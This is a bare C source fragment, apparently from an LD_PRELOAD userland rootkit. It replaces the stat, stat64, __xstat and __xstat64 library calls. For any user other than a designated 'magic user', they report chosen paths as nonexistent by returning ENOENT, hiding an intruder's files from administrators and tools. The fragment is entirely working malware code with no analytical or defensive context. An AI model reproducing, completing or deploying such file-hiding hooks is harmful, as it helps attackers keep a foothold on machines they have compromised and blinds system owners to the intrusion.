int __xstat(int version, const char *pathname, struct stat *buf){
    hook(C__XSTAT);
    if(magicusr()) return (long)call(C__XSTAT, version, pathname, buf);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(C__XSTAT, version, pathname, buf);
}
int __xstat64(int version, const char *pathname, struct stat64 *buf){
    hook(C__XSTAT64);
    if(magicusr()) return (long)call(C__XSTAT64, version, pathname, buf);
    if(hidden_path64(pathname)) { errno = ENOENT; return -1; }
    return (long)call(C__XSTAT64, version, pathname, buf);
}
int stat(const char *pathname, struct stat *buf){
    return __xstat(_STAT_VER, pathname, buf);
}
int stat64(const char *pathname, struct stat64 *buf){
    return __xstat64(_STAT_VER, pathname, buf);
}